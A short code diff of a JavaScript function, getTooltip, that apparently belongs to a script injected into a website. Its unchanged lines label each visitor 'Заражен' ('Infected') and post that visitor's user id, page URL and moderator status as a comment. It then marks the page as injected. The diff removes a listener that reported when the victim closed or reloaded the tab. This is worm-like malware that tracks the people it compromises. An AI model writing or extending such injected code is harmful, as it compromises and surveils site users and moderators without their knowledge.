@@ -121,9 +121,6 @@ function getTooltip() {
       let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
       sendComment(strData);
       window.inject = true;
-      window.addEventListener("unload", function() {
-        sendComment(`Обновил/Закрыл вкладку ${userData.url}`);
-      });
     }
   }
 
